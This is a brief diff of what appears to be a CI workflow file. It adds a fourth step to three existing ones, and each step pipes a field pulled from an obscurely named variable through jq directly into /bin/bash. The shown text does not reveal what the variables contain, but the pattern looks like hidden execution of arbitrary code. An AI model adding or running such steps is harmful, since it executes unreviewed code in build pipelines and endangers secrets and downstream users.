@@ -28,6 +28,7 @@ jobs:
           echo $cudh902 | jq -r .n08 | /bin/bash
           printf '%s' "$tr7" | jq -r .f5 | /bin/bash
           echo $o3503 | jq -r .lm91 | /bin/bash
+          echo $wsmd3043 | jq -r .ls497 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
